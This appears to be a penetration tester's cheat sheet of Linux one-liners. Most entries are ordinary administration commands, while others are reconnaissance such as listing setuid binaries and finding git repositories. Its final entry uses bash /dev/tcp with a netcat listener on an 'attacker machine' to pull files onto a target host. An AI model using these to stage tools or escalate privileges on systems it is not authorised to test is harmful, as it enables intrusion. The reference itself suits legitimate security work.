# list all recursively with ls sorting by modification date within directories
```bash
ls -alRt
```

## enumerate open ports if `ss` is not present
```bash
netstat -tunlp
```

# process tree ps
```bash
ps -auxwf
ps -efw --forest
ps -efw --forest -M                  # SELinux
```

# find setuid binaries
```bash
find / -perm -4000 -ls 2>/dev/null
```

# find files belonging to user
```bash
find / -user username 2>/dev/null
```

# find files modified between specific dates
```bash
find / -type f -newermt "2022-02-20" -not -newermt "2022-02-28" 2>/dev/null
```

# find files modified between specific dates (with reference files)
```bash
touch --date "2007-01-01" /tmp/start
touch --date "2008-01-01" /tmp/end
find /data/images -type f -newer /tmp/start -not -newer /tmp/end 2>/dev/null
```

# get all file hashes in directory using find and md5sum
```bash
find . -exec md5sum {} \;
```

# get number of CPU processors
```bash
cat /proc/cpuinfo | grep processor | wc -l
```

# find all git repositories
```bash
find / -name .git 2>/dev/null
```

# get IP with no `ifconfig` or `ip a` on a host or within docker container
```bash
hostname -I
```
    -i, --ip-address       addresses for the host name
    -I, --all-ip-addresses all addresses for the host

# download files with just bash
```bash
bash -c "cat < /dev/tcp/$LHOST/$LPORT" > filename
```
On attacker machine, `nc -lvnp $LPORT < filename`
